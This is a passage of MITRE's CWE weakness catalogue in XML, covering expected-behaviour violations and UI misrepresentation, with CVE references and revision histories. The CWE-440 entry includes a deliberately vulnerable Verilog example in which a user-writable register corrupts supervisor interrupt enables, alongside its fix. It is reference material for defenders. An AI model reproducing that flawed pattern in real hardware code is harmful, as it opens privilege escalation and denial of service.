					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Common_Consequences, Description, Diagram, Weakness_Ordinalities</Modification_Comment>
				</Modification>
	    <Contribution Type="Content">
	      <Contribution_Name>Abhi Balakrishnan</Contribution_Name>
	      <Contribution_Date>2024-02-29</Contribution_Date>
	      <Contribution_Version>4.15</Contribution_Version>
	      <Contribution_ReleaseDate>2024-07-16</Contribution_ReleaseDate>
	      <Contribution_Comment>Provided diagram to improve CWE usability</Contribution_Comment>
	    </Contribution>
            <Previous_Entry_Name Date="2010-02-16">Unrestricted File Upload</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="440" Name="Expected Behavior Violation" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A feature, API, or function does not perform according to its specification.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="684" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Quality Degradation</Impact>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The provided code is extracted from the Control and Status Register (CSR), csr_regfile, module within the Hack@DAC'21 OpenPiton System-on-Chip (SoC). This module is designed to implement CSR registers in accordance with the RISC-V specification. The mie (machine interrupt enable) register is a 64-bit register [REF-1384], where bits correspond to different interrupt sources. As the name suggests, mie is a machine-level register that determines which interrupts are enabled. Note that in the example below the mie_q and mie_d registers represent the conceptual mie reigster in the RISC-V specification. The mie_d register is the value to be stored in the mie register while the mie_q register holds the current value of the mie register [REF-1385].</Intro_Text>
               <Body_Text>The mideleg (machine interrupt delegation) register, also 64-bit wide, enables the delegation of specific interrupt sources from machine privilege mode to lower privilege levels. By setting specific bits in the mideleg register, the handling of certain interrupts can be delegated to lower privilege levels without engaging the machine-level privilege mode. For example, in supervisor mode, the mie register is limited to a specific register called the sie (supervisor interrupt enable) register. If delegated, an interrupt becomes visible in the sip (supervisor interrupt pending) register and can be enabled or blocked using the sie register. If no delegation occurs, the related bits in sip and sie are set to zero.</Body_Text>
               <Body_Text>The sie register value is computed based on the current value of mie register, i.e., mie_q, and the mideleg register.</Body_Text>
               <Example_Code Nature="Bad" Language="Verilog">
                  module csr_regfile #(...)(...);<xhtml:br/>
                  ...<xhtml:br/>
                  // ---------------------------<xhtml:br/>
                  // CSR Write and update logic<xhtml:br/>
                  // ---------------------------<xhtml:br/>
                  ...<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                     if (csr_we) begin<xhtml:br/>
                        <xhtml:div style="margin-left:1em;">
                        unique case (csr_addr.address)<xhtml:br/>
                        ...<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                           riscv::CSR_SIE: begin<xhtml:br/>
                                 <xhtml:div style="margin-left:1em;">
                                 // the mideleg makes sure only delegate-able register<xhtml:br/>
                                 //(and therefore also only implemented registers) are written<xhtml:br/>
                                 <xhtml:b>mie_d = (mie_q &amp; ~mideleg_q) | (csr_wdata &amp; mideleg_q) | utval_q;</xhtml:b><xhtml:br/>
                                 </xhtml:div>
                           end<xhtml:br/>
                           ...<xhtml:br/>
                           </xhtml:div>
                        endcase<xhtml:br/>
                        </xhtml:div>
                     end<xhtml:br/>
                     </xhtml:div>
                  endmodule
               </Example_Code>
               <Body_Text>The above code snippet illustrates an instance of a vulnerable implementation of the sie register update logic, where users can tamper with the mie_d register value through the utval (user trap value) register. This behavior violates the RISC-V specification.</Body_Text>
               <Body_Text>The code shows that the value of utval, among other signals, is used in updating the mie_d value within the sie update logic. While utval is a register accessible to users, it should not influence or compromise the integrity of sie. Through manipulation of the utval register, it becomes feasible to manipulate the sie register's value. This opens the door for potential attacks, as an adversary can gain control over or corrupt the sie value. Consequently, such manipulation empowers an attacker to enable or disable critical supervisor-level interrupts, resulting in various security risks such as privilege escalation or denial-of-service attacks.</Body_Text>
               <Body_Text>A fix to this issue is to remove the utval from the right-hand side of the assignment. That is the value of the mie_d should be updated as shown in the good code example [REF-1386].</Body_Text>
               <Example_Code Nature="Good" Language="Verilog">
               module csr_regfile #(...)(...);<xhtml:br/>
               ...<xhtml:br/>
               // ---------------------------<xhtml:br/>
               // CSR Write and update logic<xhtml:br/>
               // ---------------------------<xhtml:br/>
               ...<xhtml:br/>
                  <xhtml:div style="margin-left:1em;">
                  if (csr_we) begin<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                     unique case (csr_addr.address)<xhtml:br/>
                     ...<xhtml:br/>
                        <xhtml:div style="margin-left:1em;">
                        riscv::CSR_SIE: begin<xhtml:br/>
                              <xhtml:div style="margin-left:1em;">
                              // the mideleg makes sure only delegate-able register<xhtml:br/>
                              //(and therefore also only implemented registers) are written<xhtml:br/>
                              <xhtml:b>mie_d = (mie_q &amp; ~mideleg_q) | (csr_wdata &amp; mideleg_q);</xhtml:b><xhtml:br/>
                              </xhtml:div>
                        end<xhtml:br/>
                        ...<xhtml:br/>
                        </xhtml:div>
                     endcase<xhtml:br/>
                     </xhtml:div>
                  end<xhtml:br/>
                  </xhtml:div>
               endmodule
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2003-0187</Reference>
               <Description>Program uses large timeouts on unconfirmed connections resulting from inconsistency in linked lists implementations.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0187</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0465</Reference>
               <Description>"strncpy" in Linux kernel acts different than libc on x86, leading to expected behavior difference - sort of a multiple interpretation error?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0465</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3265</Reference>
               <Description>Buffer overflow in product stems the use of a third party library function that is expected to have internal protection against overflows, but doesn't.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3265</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Expected behavior violation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-1384"/>
            <Reference External_Reference_ID="REF-1385"/>
            <Reference External_Reference_ID="REF-1386"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Theoretical">The behavior of an application that is not consistent with the expectations of the developer may lead to incorrect use of the software.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relevant_Properties, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relevant_Properties</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Description, Observed_Examples, Theoretical_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
					<Contribution_Name>Chen Chen, Rahul Kande, Jeyavijayan Rajendran</Contribution_Name>
					<Contribution_Organization>Texas A&amp;M University</Contribution_Organization>
					<Contribution_Date>2023-06-21</Contribution_Date>
					<Contribution_Comment>suggested demonstrative example</Contribution_Comment>
				</Contribution>
				<Contribution Type="Content">
					<Contribution_Name>Shaza Zeitouni, Mohamadreza Rostami, Ahmad-Reza Sadeghi</Contribution_Name>
					<Contribution_Organization>Technical University of Darmstadt</Contribution_Organization>
					<Contribution_Date>2023-06-21</Contribution_Date>
					<Contribution_Comment>suggested demonstrative example</Contribution_Comment>
				</Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="451" Name="User Interface (UI) Misrepresentation of Critical Information" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The user interface (UI) does not properly represent critical information to the user, allowing the information - or its source - to be obscured or spoofed. This is often a component in phishing attacks.</Description>
         <Extended_Description>
            <xhtml:p>If an attacker can cause the UI to display erroneous data, or to otherwise convince the user to display information that appears to come from a trusted source, then the attacker could trick the user into performing the wrong action. This is often a component in phishing attacks, but other kinds of problems exist. For example, if the UI is used to monitor the security state of a system or network, then omitting or obscuring an important indicator could prevent the user from detecting and reacting to a security-critical event.</xhtml:p>
            <xhtml:p>UI misrepresentation can take many forms:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Incorrect indicator: incorrect information is displayed, which prevents the user from understanding the true state of the product or the environment the product is monitoring, especially of potentially-dangerous conditions or operations. This can be broken down into several different subtypes.</xhtml:li>
                  <xhtml:li>Overlay: an area of the display is intended to give critical information, but another process can modify the display by overlaying another element on top of it. The user is not interacting with the expected portion of the user interface. This is the problem that enables clickjacking attacks, although many other types of attacks exist that involve overlay.</xhtml:li>
                  <xhtml:li>Icon manipulation: the wrong icon, or the wrong color indicator, can be influenced (such as making a dangerous .EXE executable look like a harmless .GIF)</xhtml:li>
                  <xhtml:li>Timing: the product is performing a state transition or context switch that is presented to the user with an indicator, but a race condition can cause the wrong indicator to be used before the product has fully switched context. The race window could be extended indefinitely if the attacker can trigger an error.</xhtml:li>
                  <xhtml:li>Visual truncation: important information could be truncated from the display, such as a long filename with a dangerous extension that is not displayed in the GUI because the malicious portion is truncated. The use of excessive whitespace can also cause truncation, or place the potentially-dangerous indicator outside of the user's field of view (e.g. "filename.txt .exe"). A different type of truncation can occur when a portion of the information is removed due to reasons other than length, such as the accidental insertion of an end-of-input marker in the middle of an input, such as a NUL byte in a C-style string.</xhtml:li>
                  <xhtml:li>Visual distinction: visual information might be presented in a way that makes it difficult for the user to quickly and correctly distinguish between critical and unimportant segments of the display.</xhtml:li>
                  <xhtml:li>Homographs: letters from different character sets, fonts, or languages can appear very similar (i.e. may be visually equivalent) in a way that causes the human user to misread the text (for example, to conduct phishing attacks to trick a user into visiting a malicious web site with a visually-similar name as a trusted site). This can be regarded as a type of visual distinction issue.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="684" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="221" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="346" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Scope>Access Control</Scope>
               <Impact>Hide Activities</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Perform data validation (e.g. syntax, length, etc.) before interpreting the data.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>Create a strategy for presenting information, and plan for how to display unusual characters.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-2227</Reference>
               <Description>Web browser's filename selection dialog only shows the beginning portion of long filenames, which can trick users into launching executables with dangerous extensions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2227</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0398</Reference>
               <Description>Attachment with many spaces in filename bypasses "dangerous content" warning and uses different icon. Likely resultant.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0398</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0643</Reference>
               <Description>Misrepresentation and equivalence issue.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0643</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0593</Reference>
               <Description>Lock spoofing from several different weaknesses.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0593</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1104</Reference>
               <Description>Incorrect indicator: web browser can be tricked into presenting the wrong URL</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1104</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0143</Reference>
               <Description>Incorrect indicator: Lock icon displayed when an insecure page loads a binary file loaded from a trusted site.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0143</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0144</Reference>
               <Description>Incorrect indicator: Secure "lock" icon is presented for one channel, while an insecure page is being simultaneously loaded in another channel.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0144</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0761</Reference>
               <Description>Incorrect indicator: Certain redirect sequences cause security lock icon to appear in web browser, even when page is not encrypted.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0761</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2219</Reference>
               <Description>Incorrect indicator: Spoofing via multi-step attack that causes incorrect information to be displayed in browser address bar.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2219</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0537</Reference>
               <Description>Overlay: Wide "favorites" icon can overlay and obscure address bar</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0537</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2271</Reference>
               <Description>Visual distinction: Web browsers do not clearly associate a Javascript dialog box with the web page that generated it, allowing spoof of the source of the dialog. "origin validation error" of a sort?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2271</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2272</Reference>
               <Description>Visual distinction: Web browsers do not clearly associate a Javascript dialog box with the web page that generated it, allowing spoof of the source of the dialog. "origin validation error" of a sort?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2273</Reference>
               <Description>Visual distinction: Web browsers do not clearly associate a Javascript dialog box with the web page that generated it, allowing spoof of the source of the dialog. "origin validation error" of a sort?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2273</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2274</Reference>
               <Description>Visual distinction: Web browsers do not clearly associate a Javascript dialog box with the web page that generated it, allowing spoof of the source of the dialog. "origin validation error" of a sort?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2274</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1410</Reference>
               <Description>Visual distinction: Browser allows attackers to create chromeless windows and spoof victim's display using unprotected Javascript method.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1410</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0197</Reference>
               <Description>Visual distinction: Chat client allows remote attackers to spoof encrypted, trusted messages with lines that begin with a special sequence, which makes the message appear legitimate.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0197</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0831</Reference>
               <Description>Visual distinction: Product allows spoofing names of other users by registering with a username containing hex-encoded characters.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0831</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1025</Reference>
               <Description>Visual truncation: Special character in URL causes web browser to truncate the user portion of the "user@domain" URL, hiding real domain in the address bar.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1025</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0243</Reference>
               <Description>Visual truncation: Chat client does not display long filenames in file dialog boxes, allowing dangerous extensions via manipulations including (1) many spaces and (2) multiple file extensions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0243</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1575</Reference>
               <Description>Visual truncation: Web browser file download type can be hidden using whitespace.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1575</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2530</Reference>
               <Description>Visual truncation: Visual truncation in chat client using whitespace to hide dangerous file extension.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2530</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0590</Reference>
               <Description>Visual truncation: Dialog box in web browser allows user to spoof the hostname via a long "user:pass" sequence in the URL, which appears before the real hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0590</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1451</Reference>
               <Description>Visual truncation: Null character in URL prevents entire URL from being displayed in web browser.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1451</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2258</Reference>
               <Description>Miscellaneous -- [step-based attack, GUI] -- Password-protected tab can be bypassed by switching to another tab, then back to original tab.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2258</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1678</Reference>
               <Description>Miscellaneous -- Dangerous file extensions not displayed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1678</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0722</Reference>
               <Description>Miscellaneous -- Web browser allows remote attackers to misrepresent the source of a file in the File Download dialog box.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0722</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>UI Misrepresentation of Critical Information</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="154"/>
            <Related_Attack_Pattern CAPEC_ID="163"/>
            <Related_Attack_Pattern CAPEC_ID="164"/>
            <Related_Attack_Pattern CAPEC_ID="173"/>
            <Related_Attack_Pattern CAPEC_ID="98"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-434" Section="7.16. Foil Semantic Attacks"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">This entry should be broken down into more precise entries. See extended description.</Note>
            <Note Type="Research Gap">Misrepresentation problems are frequently studied in web browsers, but there are no known efforts for classifying these kinds of problems in terms of the shortcomings of the interface. In addition, many misrepresentation issues are resultant.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-13</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Defined several different subtypes of this issue.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Maintenance_Notes, Name, Observed_Examples, Other_Notes, References, Relationships, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Observed_Examples, References, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2014-02-18">UI Misrepresentation of Critical Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="470" Name="Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.</Description>
